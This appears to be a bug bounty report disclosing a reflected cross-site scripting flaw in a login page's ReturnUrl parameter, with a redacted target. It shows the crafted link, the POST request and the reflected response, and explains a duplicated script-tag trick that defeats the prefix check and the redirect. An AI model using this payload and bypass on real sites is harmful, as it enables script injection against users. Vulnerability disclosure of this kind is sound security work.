Reflected Cross-Site Scripting (XSS) — Login ReturnUrl

BOUNTY-DEX Vulnerability Report

Type: Reflected XSS

MEDIUM

Summary

The application places a `ReturnUrl` value in the login page URL (GET). When a user submits the login form, that same `ReturnUrl` value is included inside the POST body as the `ReturnUrl` form parameter. The server later reflects this POST value into a JavaScript context in the response (window.location) without proper escaping. Because an attacker can craft a link containing a malicious payload in the URL and trick a victim into visiting it and then logging in, the reflected payload executes in the victim's browser after login. This is therefore a reflected XSS triggered by the login flow.

Proof of Concept

First, the victim is sent to the login page using the following malicious link:

https://redacted.redacted.com/XXX/YYY/ZZZ/Login?returnUrl=REDACTED_ENDPOINT'<script>print()</script><script>print()</script>

As shown above, the XSS payload is placed inside the returnUrl parameter, prefixed with REDACTED_ENDPOINT. This is required because the application validates that returnUrl starts with that prefix. If it does not, the user is redirected elsewhere and the payload is not triggered.

Login request with the payload included:

POST /XXX/YYY/ZZZ/Login HTTP/1.1
Host: [REDACTED]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary...
Content-Disposition: form-data; name="ReturnUrl"

/XXX/YYY/ZZZ/AAA?response_type=code&client_id=[REDACTED]&...&returnUrl=REDACTED_ENDPOINT'<script>print()</script><script>print()</script>
------WebKitFormBoundary...
Content-Disposition: form-data; name="Username"

victim@example.com
------WebKitFormBoundary...

The server response shows that the payload is reflected inside window.location as follow:

<script>
window.location = 'REDACTED_ENDPOINT';
<script>print()</script><script>print()</script>'
</script>

If you're wondering why this payload was used instead of a simple javascript:alert(1), it's because the application requires REDACTED_ENDPOINT at the beginning of the returnUrl parameter. On the other hand, using ';<script>print()</script> as the payload will not work because the DOM is parsed from top to bottom, causing window.location to execute before the XSS payload is rendered in the DOM. I was able to bypass this by confusing window.location through duplicated <script> tags, preventing it from being triggered while still allowing the payload to execute.

As a result, the XSS payload executes in the victim's browser after login.
